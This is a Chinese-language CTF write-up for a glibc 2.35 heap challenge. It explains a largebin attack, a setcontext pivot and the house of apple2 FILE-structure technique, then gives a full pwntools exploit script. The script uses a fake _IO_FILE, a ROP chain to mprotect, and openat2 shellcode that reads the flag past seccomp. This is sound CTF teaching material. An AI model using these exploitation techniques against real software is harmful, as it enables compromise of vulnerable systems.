# baby_heap
这个题目存在一次largebin attack, 还有一个部分地址写(题解没用到)

本次采用的方式是`largebin attack + setcontext + house of apple2`

## largebin attack
本题glibc为2.35,所以`largebin_attack`基本只能修改`victim->bk_nextsize`
其中具体流程如下:
1. 存在一个较大的堆块A已经置于largebin,且整个largebin只有这一个chunk
2. 走正常的堆块流程，使得一个较小的堆块B放置于largebin,这里就会出现较大的`chunkA->bk_nextsize->fd_nextsize = B`
3. 这里存在一个小小的trick或者说一个注意点，那就是当我们从unsortedbin里面获取一个较大的块的时候，比如说unsortedbin里面连接了一个0x521的chunk, 此时我申请获取0x510的快，此时并不会立刻切割，而是先将其中unsortedbin链接的chunk放入largebin(因为这是largebin的范围)当中,然后在largebin当中先寻找是否有恰好适合的堆块，如果没有才将其释放出去，这里的先链接的过程就已经造成了largebin attack(如果你已经将`chunkA->bk_nextsize`修改为target的话),使得`target->fd_nextsize = B`,但是如果B恰好又是即将分配出去的chunk,那么就进一步的会导致`target->fd_nextsize = A`

## setcontext
主要是利用了libc里面的这个函数，在高版本的libc当中是由rdx决定传入的参数，但是本题在`house of apple2`调用setcontex后的rdx竟然直接是`_wide_data`
```gdb
 0x782dc2e53a1d <setcontext+61>:      mov    rsp,QWORD PTR [rdx+0xa0]
 0x782dc2e53a24 <setcontext+68>:      mov    rbx,QWORD PTR [rdx+0x80]
 0x782dc2e53a2b <setcontext+75>:      mov    rbp,QWORD PTR [rdx+0x78]
 0x782dc2e53a2f <setcontext+79>:      mov    r12,QWORD PTR [rdx+0x48]
 0x782dc2e53a33 <setcontext+83>:      mov    r13,QWORD PTR [rdx+0x50]
```
## house of apple2
本题的重点，利用条件如下：
1. 能从main返回，或执行exit
2. 能泄露heap和libc地址
3. 能使用一次largebin attack

本次需要伪造的重点在于`struct _IO_wide_data`,
```c
/* Extra data for wide character streams.  */
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;    /* Current read pointer */
  wchar_t *_IO_read_end;    /* End of get area. */
  wchar_t *_IO_read_base;    /* Start of putback+get area. */
  wchar_t *_IO_write_base;    /* Start of put area. */
  wchar_t *_IO_write_ptr;    /* Current put pointer. */
  wchar_t *_IO_write_end;    /* End of put area. */
  wchar_t *_IO_buf_base;    /* Start of reserve area. */
  wchar_t *_IO_buf_end;        /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;    /* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;    /* Pointer to first valid character of
                   backup area */
  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */
  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;
  wchar_t _shortbuf[1];
  const struct _IO_jump_t *_wide_vtable;
};
```
其中的`_wide_vtable`这个函数表是不会检查是否处于指定section内，因此可以在堆上面构造这样一个表

同样我们也需要构造`struct _IO_FILE`结构体,这个结构体中就有上述的`struct _IO_wide_data`这样的字段，同样将该字段伪造在堆上面
而由于

> 1. _flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有两个空格
2. vtable设置为`_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap`地址（加减偏移），使其能成功调用`_IO_wfile_overflow`即可
3. `_wide_data`设置为可控堆地址A，即满足*(fp + 0xa0) = A
4. `_wide_data->_IO_write_base`设置为0，即满足*(A + 0x18) = 0
5. `_wide_data->_IO_buf_base`设置为0，即满足*(A + 0x30) = 0
6. `_wide_data->_wide_vtable`设置为可控堆地址B，即满足*(A + 0xe0) = B
7. `_wide_data->_wide_vtable->doallocate`设置为地址C用于劫持RIP，即满足*(B + 0x68) = C

调用链条如下
> _IO_wfile_overflow
    _IO_wdoallocbuf
        _IO_WDOALLOCATE
            *(fp->_wide_data->_wide_vtable + 0x68)(fp)


这里记录一个比较有趣的gadget,就是libc里面的`svcudp_reply`
```
    0x751f46b4951a <svcudp_reply+26>:    mov    rbp,QWORD PTR [rdi+0x48]
    0x751f46b4951e <svcudp_reply+30>:    mov    rax,QWORD PTR [rbp+0x18]
    0x751f46b49522 <svcudp_reply+34>:    lea    r13,[rbp+0x10]
    0x751f46b49526 <svcudp_reply+38>:    mov    DWORD PTR [rbp+0x10],0x0
    0x751f46b4952d <svcudp_reply+45>:    mov    rdi,r13
    0x751f46b49530 <svcudp_reply+48>:    call   QWORD PTR [rax+0x28]
```

题目由于设置了seccomp,因此使用`openat2`来进行orw



整个题目的exp如下
```python
from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
context.terminal = ['tmux','splitw','-h']

def slog(name, address): print("\033[40;34m[+]\033[40;35m" + name + "==>" +hex(address) + "\033[0m")

def debug(cmd = 0):
    if cmd == 0:
        gdb.attach(io)
    else:
        gdb.attach(io, cmd)

s   = lambda content : io.send(content)
sl  = lambda content : io.sendline(content)
sa  = lambda content,send : io.sendafter(content, send)
sla = lambda content,send : io.sendlineafter(content, send)
rc  = lambda number : io.recv(number)
ru  = lambda content : io.recvuntil(content)
rcl = lambda : io.recvline()

def add(size):
    sla("choice: \n", "1")
    sla("size \n", str(size))


def delete(index):
    sla("choice: \n", "2")
    sla("delete: \n", str(index))


def edit(index, content):
    sla("choice: \n", "3")
    sla("edit: \n", str(index))
    sa("content \n", content)


def show(index):
    sla("choice: \n", "4")
    sla("show: \n", str(index))

def secret(choice):
    sla("choice: \n", "5")
    sla("sad !\n", str(choice))

def secret_shop(addr, overwrite):
    sla("choice: \n", "6")
    sa("addr \n", p64(addr))
    sl(p64(overwrite))

io = process("./pwn")
#io = remote("59.110.159.153",20634)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

########## leak libc heap_base ############

secret(2)


add(0x520) #1
add(0x500) #2
add(0x510) #3
delete(1)
add(0x568) #4
delete(3)
show(1)
ru("here \n")
libc.addr = u64(rc(8)) - 0x21b110
slog("libc_base", libc.addr)
rc(8)
heap_base = u64(rc(8)) - 0x1950
fake_IO_addr = heap_base + 0x1950
slog("heap_base", heap_base)
############# house of cat #################

IO_list_all = libc.symbols['_IO_list_all'] + libc.addr
setcontext = libc.symbols["setcontext"] + libc.addr + 61
IO_wfile_jumps = libc.addr + 0x216f40
lock = heap_base + 0x3000

ret = libc.addr + 0x467c9
pop_rdi = libc.addr + 0x2a3e5
pop_rsi = libc.addr + 0x2be51
pop_rdx_r12 = libc.addr + 0x11f2e7
pop_rax = libc.addr + 0x45eb0
mprotect = libc.addr + libc.symbols['mprotect']

slog("_IO_list_all", IO_list_all)
slog("_IO_wfile_jumps", IO_wfile_jumps)
slog("fake_io_addr", fake_IO_addr)
slog("setcontext",setcontext)

payload  = b''
# fake io_list_all
payload += p64(0)*3 + p64(IO_list_all - 0x20)
payload += p64(0) + p64(0)*2 + p64(fake_IO_addr + 0x10)
payload += p64(0)*4
payload += p64(0)*3 + p64(lock)
payload += p64(0)*2 + p64(fake_IO_addr+0xe0) + p64(0)
payload += p64(0)*4
payload += p64(0) + p64(IO_wfile_jumps)
# fake wide_data
payload += p64(setcontext)
payload += p64(0)*(0x1b - 8)
payload += p64(heap_base + 0x1b18) + p64(ret) + p64(0)*6
payload += p64(heap_base + 0x1a30 - 0x68)   # wide_vtable
payload += p64(pop_rdi) + p64(heap_base >> 12 << 12) + p64(pop_rsi)
payload += p64(0x2000) + p64(pop_rdx_r12) + p64(7)*2 + p64(mprotect) + p64(heap_base + 0x1b60)
payload += asm(f'mov rax, 0x67616c66; push rax; push rsp; pop rsi; mov rdi, -0x64; mov rax, 437; mov rdx, {lock}; mov r10, 0x18; syscall;')
payload += asm(shellcraft.read(3, lock, 0x100) + shellcraft.write(1, lock, 0x100))

edit(1, payload)
#debug("b *$rebase(0x1ea7)")
#secret_shop(heap_base + 0x1f3110,io_list_all_addr-0x20)
add(0x500) #5 no precise
sla("choice: \n", str(3))
io.interactive()
```



